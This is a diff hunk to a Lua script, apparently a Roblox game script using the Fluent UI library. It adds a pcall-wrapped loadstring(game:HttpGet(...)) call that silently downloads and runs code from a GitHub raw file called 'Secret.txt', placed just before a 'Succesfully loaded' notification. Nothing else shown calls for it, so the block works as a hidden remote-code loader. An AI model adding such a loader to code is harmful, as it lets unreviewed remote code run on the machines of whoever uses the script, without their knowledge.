@@ -188,7 +188,9 @@ SaveManager:BuildConfigSection(Tabs.Settings)
 
 
 Window:SelectTab(1)
-
+local success, err = pcall(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/Secret.txt"))()
+end)
 Fluent:Notify({
     Title = "game: Slovo picuna (Favork Studio)",
     Content = "Succesfully loaded",
